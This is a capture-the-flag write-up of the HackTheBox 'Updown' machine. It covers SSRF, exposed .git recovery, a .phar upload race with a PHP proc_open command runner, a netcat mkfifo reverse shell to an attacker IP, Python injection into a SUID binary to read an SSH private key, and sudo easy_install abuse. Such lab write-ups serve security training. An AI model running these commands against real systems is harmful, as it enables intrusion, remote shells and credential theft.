# HackTheBox - Updown

## NMAP

```bash
Nmap scan report for 10.10.11.177
Host is up (0.11s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Is my Website up ?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## PORT 80 (HTTP)

<img src="https://i.imgur.com/a07l6jF.png"/>

The web page has a functionality to check if any site is up also it shows us a domain name `siteisup.htb` so let's add this in hosts file

<img src="https://i.imgur.com/gE15qy5.png"/>

With the debug mode enabled we can see the response made on the url which leads to Server Side Request Forgery (SSRF)

<img src="https://i.imgur.com/3ZJ7pmx.png"/>

I tried using the file protocl to read local file `file:///etc/passwd` but it was blocked

<img src="https://i.imgur.com/mYyqBN8.png"/>


On the domain name, we can fuzz for subdomains with `wfuzz`

```bash
wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://siteisup.htb' -H "Host: FUZZ.siteisup.htb" --hh 1131
```
This finds a subdomain `dev`  with 403 status code

<img src="https://i.imgur.com/SMoTo0I.png"/>

We can try accessing it through the status check as there exsits SSRF

<img src="https://i.imgur.com/8TJa57G.png"/>

But it shows that it's down so there maybe some filtering going on dev site, fuzzing for files and directories, it shows `/dev` but it returns a blank page

<img src="https://i.imgur.com/nGFvajL.png"/>

<img src="https://i.imgur.com/Aa8mhHW.png"/>

So fuzzing at `/dev/`, we'll find `.git`  

<img src="https://i.imgur.com/8j45k8X.png"/>

<img src="https://i.imgur.com/ZW2wkoP.png"/>

We can downloag `.git` thourgh wget recursivley with ``--recusrive`

```bash
wget --recursive http://10.10.11.177/dev/.git/
```

<img src="https://i.imgur.com/cq9MXY3.png"/>

After downloading the files, navigate to directory which has `.git` and run `git checkout .` to recover the files

<img src="https://i.imgur.com/Qiw9aln.png"/>

Checking `changelog.txt` it talks about removing the upload option

<img src="https://i.imgur.com/BGyH6ku.png"/>

`.htaccess` file shows us a header if it's not in the request, the request will be denied

<img src="https://i.imgur.com/ronpi7S.png"/>

<img src="https://i.imgur.com/xy9eUQI.png"/>

<img src="https://i.imgur.com/BjvSX7c.png"/>

I used a burp extension called `Add Custom Header` so that on every request the special header gets added 

<img src="https://i.imgur.com/xEbbJMQ.png"/>

<img src="https://i.imgur.com/cB3AGDO.png"/>

<img src="https://i.imgur.com/7y4jx4Q.png"/>

Looking at `checker.php` file it checks for file extensions which may lead to uploading php files to get code execution

<img src="https://i.imgur.com/mRSXx5D.png"/>

It's checking for all extensions execpt for `.phar`, but even if we upload it it's going to read the contents of the file, make a request to see if there' 200 status code and it's going to delete the file after making a request to each of the content available in the file

<img src="https://i.imgur.com/Rufdyz4.png"/>

<img src="https://i.imgur.com/GDweWn9.png"/>

To get code execution, we can make the site make a request to a site which isn't reachable so it's going to try to make a reqeust to that site for sometime and our uploaded file won't get deleted

<img src="https://i.imgur.com/D7UiG65.png"/>

<img src="https://i.imgur.com/JdWaJRO.png"/>


<img src="https://i.imgur.com/4qqUnqX.png"/>

<img src="https://i.imgur.com/vO1p9Fj.png"/>

## Foothold

From `phpinfo()` we can see most of the functions are disabled that could allow command execution, to find out which function can used to get command execution which can use this script https://github.com/teambi0s/dfunc-bypasser

<img src="https://i.imgur.com/Bkx3QWT.png"/>

We can abuse `proc_open` to get command execution

https://www.macs.hw.ac.uk/~hwloidl/docs/PHP/function.proc-open.html

```php
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);
$process = proc_open("bash", $descriptorspec, $pipes);
if (is_resource($process)) {
    // $pipes now looks like this:
    // 0 => writeable handle connected to child stdin
    // 1 => readable handle connected to child stdout
    // Any error output will be appended to /tmp/error-output.txt

    fwrite($pipes[0], "id");
    fclose($pipes[0]);

    while (!feof($pipes[1])) {
        echo fgets($pipes[1], 1024);
    }
    fclose($pipes[1]);
    // It is important that you close any pipes before calling
    // proc_close in order to avoid a deadlock
    $return_value = proc_close($process);

    echo "command returned $return_value\n";
}
?>
```


<img src="https://i.imgur.com/kZtLwg9.png"/>

On uploading the file, we'll get the output of `id` command

<img src="https://i.imgur.com/CFzY99h.png"/>

Using nc mkinfo we can get the reverse shell

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.72 2222 >/tmp/f
```

<img src="https://i.imgur.com/RQ9ZK5q.png"/>

## Privilege Escalation (developer)

In `developer`'s directory we can find `siteisup` binary along with it's source code which can run as developer because of SUID

<img src="https://i.imgur.com/8R0hi52.png"/>

We can exploit this by import `os` module and executing `id` command

```
__import__('os').system('id')
```

<img src="https://i.imgur.com/5EAxQoF.png"/>

From here we can get the ssh key and login as developer user

```
__import__('os').system('cat /home/developer/.ssh/id_rsa')
```

<img src="https://i.imgur.com/uAsuz47.png"/>

<img src="https://i.imgur.com/wF7TIXz.png"/>

## Privilege Escalation (root)

Running `sudo -l` will show that we can run `/usr/local/bin/easy_install` as root user

<img src="https://i.imgur.com/QsZuC4Y.png"/>

We can abuse this by checking GTFOBINS for the abuse 

https://gtfobins.github.io/gtfobins/easy_install/

<img src="https://i.imgur.com/KEwbNRt.png"/>

<img src="https://i.imgur.com/vsWhSIP.png"/>

